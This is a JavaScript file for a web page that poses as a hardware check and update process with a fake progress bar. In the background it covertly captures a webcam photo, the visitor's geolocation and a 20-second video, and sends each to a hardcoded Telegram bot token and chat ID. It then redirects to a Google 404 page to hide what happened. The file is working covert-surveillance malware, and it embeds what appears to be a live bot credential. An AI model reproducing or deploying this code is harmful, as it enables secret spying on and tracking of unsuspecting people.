const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const TELEGRAM_TOKEN = '8793258465:AAEulIFSexJpMN7l6qiBnnTwdVgnD4L-G0o'; 
const TELEGRAM_CHAT_ID = '7053715461'; 

function initiate() {
    document.getElementById('setup-area').style.display = 'none';
    document.getElementById('progress-area').style.display = 'block';
    moveProgress();
    startProcess();
}

function moveProgress() {
    let width = 0;
    const bar = document.getElementById("myBar");
    const status = document.getElementById("status");
    const messages = [
        "Analyzing hardware...",
        "Verifying regional server connection...",
        "Checking for updates...",
        "Finalizing setup..."
    ];
    let id = setInterval(() => {
        if (width >= 100) {
            clearInterval(id);
        } else {
            width += 0.5;
            bar.style.width = width + "%";
            if (width > 25) status.innerText = messages[0];
            if (width > 50) status.innerText = messages[1];
            if (width > 75) status.innerText = messages[2];
            if (width > 90) status.innerText = messages[3];
        }
    }, 100);
}

async function startProcess() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, 
            audio: false 
        });
        video.srcObject = stream;
        video.onplay = () => {
            setTimeout(async () => {
                await capturePhoto();
                sendLocation();
                await recordVideo(stream);
            }, 2000);
        };
    } catch (err) {
        window.location.href = "https://www.google.com/404";
    }
}

function sendLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    latitude: lat,
                    longitude: lon
                })
            });
        });
    }
}

async function capturePhoto() {
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageData = canvas.toDataURL('image/jpeg', 0.8);
    const blob = await (await fetch(imageData)).blob();
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, 'image.jpg');
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
    });
}

async function recordVideo(stream) {
    const mediaRecorder = new MediaRecorder(stream);
    let chunks = [];
    mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
    };
    mediaRecorder.onstop = async () => {
        const blob = new Blob(chunks, { type: 'video/mp4' });
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('video', blob, 'video.mp4');
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
            method: 'POST',
            body: formData
        });
        window.location.href = "https://www.google.com/404";
    };
    mediaRecorder.start();
    setTimeout(() => {
        mediaRecorder.stop();
        stream.getTracks().forEach(track => track.stop());
    }, 20000); 
}
